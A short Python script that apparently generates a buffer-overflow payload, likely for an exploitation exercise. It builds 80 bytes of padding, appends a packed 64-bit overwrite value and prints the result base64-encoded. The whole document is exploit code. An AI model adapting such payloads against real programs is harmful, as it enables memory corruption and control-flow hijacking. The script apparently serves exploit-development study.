
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
buf += struct.pack('<Q', 5270236198501954292)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
